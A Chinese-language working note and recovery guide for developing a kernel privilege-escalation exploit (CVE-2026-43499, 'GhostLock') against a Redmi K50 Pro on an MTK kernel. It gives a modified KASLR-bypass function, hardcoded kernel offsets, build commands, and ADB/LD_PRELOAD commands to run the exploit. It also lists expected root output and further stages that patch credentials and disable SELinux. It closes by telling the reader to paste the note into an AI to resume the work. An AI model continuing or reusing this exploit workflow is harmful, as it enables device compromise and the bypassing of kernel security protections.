# 🛠️ CVE-2026-43499 (GhostLock) — 工作概览与恢复指南

> 生成时间: 2026-07-13 06:45
> 设备: Redmi K50 Pro (matisse) / HyperOS 2.0.6.0.ULKCNXM / MTK 5.10.209

---

## 一、已完成工作总结

### 1.1 KASLR 绕过 — 已解决 ✅

| 项目 | 值 |
|------|-----|
| `_text` (运行时) | `0xffffffc008000000` |
| `KIMAGE_TEXT_BASE` | `0xffffffc008000000` |
| KASLR slide | **0**（无随机化） |
| `init_task` 地址 | `0xffffffc00a79bec0` |
| `INIT_TASK_OFF` | `0x279BEC0` |

**结论：MTK 设备 KASLR 未生效，pselect 侧信道失效，已改为硬编码 slide=0。**

### 1.2 修改的文件

**文件：** `CyberMeowfia/IonStack/CVE-2026-43499/exploit/src/slide.c`

**修改内容：** 函数 `slide_leak_kernel_base()` 原本执行 pselect futex PI 侧信道泄漏 `_stext`，
在 MTK 上全部失败。已改为直接返回硬编码值：

```c
int slide_leak_kernel_base(void) {
  // MTK KASLR bypass: pselect 侧信道在 MTK 调度器上失效
  // kallsyms 确认运行时 _text == KIMAGE_TEXT_BASE, slide=0
  kaslr_base = KIMAGE_TEXT_BASE;   // 0xffffffc008000000
  kaslr_slide = 0;
  kaslr_done = 1;
  return 1;
}
```

### 1.3 编译

**编译命令：**
```bash
cd CyberMeowfia/IonStack/CVE-2026-43499/exploit && \
make PROJECT=matisse-OS2.0.6.0.ULKCNXM API=34 CC=clang
```

**编译产物：**
- `CyberMeowfia/IonStack/CVE-2026-43499/exploit/build/matisse-OS2.0.6.0.ULKCNXM/bin/preload.so`
- 已另存副本到根目录：`preload_mtk_noslide.so`
- SHA256: `b4fe139a9aac715a586258044447b341a433c344ce5105b5721bb7c3d7309eaa`

---

## 二、关键路径速查

```
项目根目录:
  /storage/emulated/0/Documents/matisse_backup_essentials/

popsicle exploit 源码:
  CyberMeowfia/IonStack/CVE-2026-43499/exploit/

target.h (matisse 配置文件):
  CyberMeowfia/IonStack/CVE-2026-43499/exploit/src/targets/matisse-OS2.0.6.0.ULKCNXM/target.h

slide.c (KASLR 绕过 - 已修改):
  CyberMeowfia/IonStack/CVE-2026-43499/exploit/src/slide.c

编译输出:
  CyberMeowfia/IonStack/CVE-2026-43499/exploit/build/matisse-OS2.0.6.0.ULKCNXM/bin/preload.so

备用副本:
  preload_mtk_noslide.so

内核符号表:
  kallsyms.txt

内核镜像:
  kernel.Image               (46MB, GZIP+XZ 压缩的 ARM64 Image)
  kernel_with_symbols.elf     (54MB, 包含符号的 ELF)
  kernel.gz                   (19MB, 解压中间产物)
```

---

## 三、测试命令（电脑 ADB）

```bash
# 1. 推送新版 preload.so
adb push preload_mtk_noslide.so /data/local/tmp/preload_mtk_noslide.so

# 2. 设置权限
adb shell chmod 755 /data/local/tmp/preload_mtk_noslide.so

# 3. 运行测试
adb shell "LD_PRELOAD=/data/local/tmp/preload_mtk_noslide.so /system/bin/true"
```

**预期日志关键行：**
- ✅ `[+] slide-kaslr-mtk-hardcoded pid=xxx base=ffffffc008000000 slide=0`
- ✅ 不再出现 `slide bad leaked pointer` 或 `slide attempt X failed`
- 若全部通过：`[+] pipe-physrw-summary ... root=1`

---

## 四、如果仍需修改

### 4.1 重新编译流程

```bash
cd /storage/emulated/0/Documents/matisse_backup_essentials/CyberMeowfia/IonStack/CVE-2026-43499/exploit

# 清理 + 编译
make PROJECT=matisse-OS2.0.6.0.ULKCNXM API=34 CC=clang clean
make PROJECT=matisse-OS2.0.6.0.ULKCNXM API=34 CC=clang

# 复制到根目录
cp build/matisse-OS2.0.6.0.ULKCNXM/bin/preload.so \
   /storage/emulated/0/Documents/matisse_backup_essentials/preload_mtk_noslide.so
```

### 4.2 查看编译信息
```bash
make PROJECT=matisse-OS2.0.6.0.ULKCNXM API=34 CC=clang info
```

### 4.3 关键 target.h 参数速查

| 宏 | 值 | 说明 |
|----|-----|------|
| KIMAGE_TEXT_BASE | 0xffffffc008000000 | 内核代码基址 |
| INIT_TASK_OFF | 0x279bec0 | init_task 相对 _text 偏移 |
| P0_PAGE_OFFSET | 0xffffff8000000000 | 物理内存直接映射起点 |
| P0_PHYS_OFFSET | 0x80000000 | 物理内存起始地址 |

### 4.4 kallsyms 查找命令
```bash
# 在项目根目录执行
grep 'init_task\|_text\|_stext' kallsyms.txt | grep -v '__\|perf_\|event\|rcu_'
```

---

## 五、编译环境 (Termux)

| 工具 | 版本 |
|------|------|
| clang | 21.1.8 (aarch64-unknown-linux-android24) |
| make | GNU Make 4.4.1 |
| binutils | 已安装 |

编译关键点：必须设置 `CC=clang` 让 Makefile 使用 Termux 原生 clang，而非寻找 NDK。

---

## 六、当前卡点（已解决→待验证）

原问题：pselect 侧信道在 MTK 调度器上全部失败，KASLR 泄漏返回无效指针。

解决方案：硬编码 slide=0（kallsyms 确认运行时无 KASLR 随机化）。

待验证：硬编码后，后续 exploit 阶段（pipe physrw、cred patch、SELinux disable）是否能正常完成。

---

*直接复制此文件内容发送给 AI 即可恢复工作上下文。*
